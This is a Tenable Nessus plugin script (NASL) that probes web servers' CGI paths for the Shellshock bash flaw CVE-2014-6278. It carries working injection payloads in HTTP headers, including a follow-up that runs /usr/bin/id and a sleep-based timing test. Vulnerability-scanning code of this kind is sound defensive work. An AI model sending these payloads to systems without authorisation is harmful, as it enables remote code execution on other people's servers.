#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82581);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/11/11 20:08:42 $");

  script_cve_id("CVE-2014-6278");
  script_bugtraq_id(70166);
  script_osvdb_id(112169);
  script_xref(name:"IAVA", value:"2014-A-0142");

  script_name(english:"GNU Bash Incomplete Fix Remote Code Injection (Shellshock)");
  script_summary(english:"Attempts to run arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is affected by a command injection vulnerability
in GNU Bash known as Shellshock. The vulnerability is due to the
processing of trailing strings after function definitions in the
values of environment variables. This allows a remote attacker to
execute arbitrary code via environment variable manipulation depending
on the configuration of the system.

Note that this vulnerability exists because of an incomplete fix for
CVE-2014-6271, CVE-2014-7169, and CVE-2014-6277.");
  script_set_attribute(attribute:"see_also", value:"http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"solution", value:"Apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'CUPS Filter Bash Environment Variable Code Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_timeout(480); # up to 8mn

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# Do not use get_http_port() here
port = get_kb_item("Services/www");
if (!port) port = 80;
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# Do not test broken web servers
broken_web = get_kb_item("Services/www/" + port + "/broken");

# Do not test CIM servers as HTTP GET requests can lead to FP situations
if (port == get_kb_item("Services/cim_listener") || broken_web)
  exit(0, 'The web server on port ' +port+ ' is broken.');

cgis = make_list('/');

cgis1 = get_kb_list('www/'+port+'/cgi');
if (!isnull(cgis1)) cgis = make_list(cgis, cgis1);

cgidirs = get_kb_list('www/'+port+'/content/extensions/*');
if (!isnull(cgidirs) && !thorough_tests)
{
  foreach dir (cgidirs)
  {
    if (ereg(pattern:'^/+cgi-bin', string:dir, icase:TRUE))
      cgis = make_list(dir, cgis);
  }
}

# Add common cgi scripts
cgis = list_uniq(make_list(cgis,
  "/_mt/mt.cgi",
  "/admin.cgi",
  "/administrator.cgi",
  "/buglist.cgi",
  "/cgi/mid.cgi",
  "/cgi-bin/admin.cgi",
  "/cgi-bin/admin.pl",
  "/cgi-bin/bugreport.cgi",
  "/cgi-bin/clwarn.cgi",
  "/cgi-bin/count.cgi",
  "/cgi-bin/Count.cgi",
  "/cgi-bin/faqmanager.cgi",
  "/cgi-bin/FormHandler.cgi",
  "/cgi-bin/FormMail.cgi",
  "/cgi-bin/guestbook.cgi",
  "/cgi-bin/help.cgi",
  "/cgi-bin/hi",
  "/cgi-bin/index.cgi",
  "/cgi-bin/index.pl",
  "/cgi-bin/index.sh",
  "/cgi-bin/mailit.pl",
  "/cgi-bin/mt/mt-check.cgi",
  "/cgi-bin/mt/mt-load.cgi",
  "/cgi-bin/mt-static/mt-check.cgi",
  "/cgi-bin/mt-static/mt-load.cgi",
  "/cgi-bin/ncbook/book.cgi",
  "/cgi-bin/quickstore.cgi",
  "/cgi-bin/search",
  "/cgi-bin/search.cgi",
  "/cgi-bin/search/search.cgi",
  "/cgi-bin/test.cgi",
  "/cgi-bin/test.sh",
  "/cgi-bin/test-cgi",
  "/cgi-bin/upload.cgi",
  "/cgi-bin/urlcount.cgi",
  "/cgi-bin/viewcvs.cgi",
  "/cgi-bin/wa",
  "/cgi-bin/wa.cgi",
  "/cgi-bin/wa.exe",
  "/cgi-bin/whois.cgi",
  "/cgi-bin-sdb/printenv",
  "/cgi-mod/index.cgi",
  "/cgi-sys/defaultwebpage.cgi",
  "/cgi-sys/entropysearch.cgi",
  "/index.cgi",
  "/index.pl",
  "/index.sh",
  "/nph-mr.cgi",
  "/query.cgi",
  "/session_login.cgi",
  "/show_bug.cgi",
  "/test",
  "/test.cgi",
  "/ucsm/isSamInstalled.cgi",
  "/whois.cgi",
  "/wp-login.php",
  "/wwwadmin.cgi",
  "/wwwboard.cgi",
  "/xampp/cgi.cgi"));

if (thorough_tests) exts = make_list("*");
else exts = make_list("cgi", "php", "php5", "pl", "py", "rb", "sh", "java", "jsp", "action", "do", "shtml");

foreach ext (exts)
{
  cgis2 = get_kb_list('www/'+port+'/content/extensions/'+ext);
  if (!isnull(cgis2)) cgis = list_uniq(make_list(cgis2, cgis));
}

if ( thorough_tests )
 headers = make_list('User-Agent', 'Referrer', 'Cookie');
else
 headers = make_list('User-Agent');

script = SCRIPT_NAME - ".nasl";
int1 = rand() % 100;
int2 = rand() % 100;



EXPLOIT_TYPE_WAIT = 0;
EXPLOIT_TYPE_STDOUT = 1;


exploits = make_list();
n = 0;

exploits[n++] = make_array(
	"type",	EXPLOIT_TYPE_STDOUT,
	"payload", '() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo "' + script+' Output : $((' + int1 + '+'+int2+'))"; }',
 	"pattern", script + " Output : " + int(int1 + int2),
	"followup", "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id; }"
	);
if (report_paranoia == 2)
{
  exploits[n++] = make_array(
	"type",	EXPLOIT_TYPE_WAIT,
	"payload", '() { _; } >_[$($())] { echo; /bin/sleep $WAITTIME; }'
	);
}


vuln = FALSE;
WaitTime = 5;

foreach cgi (cgis)
{
foreach exploit ( exploits )
{
  foreach header (headers)
  {
    then = unixtime();

    if ( exploit["type"] == EXPLOIT_TYPE_WAIT && report_paranoia == 2 )
    {
     http_set_read_timeout(WaitTime * 2);
     payload = str_replace(find:"$WAITTIME", replace:string(WaitTime), string:exploit["payload"]);
    }
    else payload = exploit["payload"];

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : cgi,
      add_headers  : make_array(header, payload),
      exit_on_fail : TRUE
    );
    now = unixtime();

    # Check that we added our two random numbers and get our expected output
    # ie : int1 = 40, int2 = 65 output should be the following :
    # bash_cve_2014_6271_rce Output : 105
    if (exploit["type"] == EXPLOIT_TYPE_STDOUT && exploit["pattern"] >< res[2])
    {
      vuln = TRUE;
      attack_req = http_last_sent_request();

      match = eregmatch(pattern:"("+exploit["pattern"]+")", string:res[2]);
      if (empty_or_null(match[1])) output = chomp(res[2]);
      else output = match[1];

      # Try and run id if our above request was a success
      res2 = http_send_recv3(
        method : "GET",
        port   : port,
        item   : cgi,
        add_headers  : make_array(header, exploit["followup"]),
        exit_on_fail : TRUE
      );

      if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res2[2]))
      {
        attack_req = http_last_sent_request();
        match2 = eregmatch(pattern:"(uid=[0-9]+.*gid=[0-9]+.*)",string:res2[2]);

        if (empty_or_null(match2[1])) output = chomp(res2[2]);
        else output = match2[1];
      }
   }
   else if ( report_paranoia == 2 && exploit["type"] == EXPLOIT_TYPE_WAIT && now - then >= WaitTime )
    {
     InitialDelta = now - then;
     attack_req = http_last_sent_request();
     output = "The request produced a wait of " + InitialDelta + " seconds";
     WaitTime1 = WaitTime;
     vuln = TRUE;

     # Test again with sleep set to 5, 10, and 15
     wtimes = make_list(5, 10, 15);

     for ( i = 0 ; i < max_index(wtimes) && vuln == TRUE; i ++ )
     {
       WaitTime1 = wtimes[i];
       http_set_read_timeout(WaitTime1 * 2);
       payload = str_replace(find:"$WAITTIME", replace:string(WaitTime1), string:exploit["payload"]);
       then1 = unixtime();
       res = http_send_recv3(method : "GET", port   : port, item   : cgi, add_headers  : make_array(header, payload), exit_on_fail : FALSE);
       now1 = unixtime();

       if ( now1 - then1 >= WaitTime1  && now1 - then1 <= (WaitTime1 + 5 ))
       {
         attack_req = http_last_sent_request();
         InitialDelta = now1 - then1;
         output = "The request produced a wait of " + InitialDelta + " seconds";
         continue;
       }
       else
       {
	vuln = FALSE;
       }
     }
    }
  if (vuln) break;
  }
   if (vuln) break;
 }
   if (vuln) break;
}


if (!vuln) exit(0, "The web server listening on port "+port+" is not affected.");

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  line_limit : 2,
  request    : make_list(attack_req),
  output     : chomp(output)
);
exit(0);
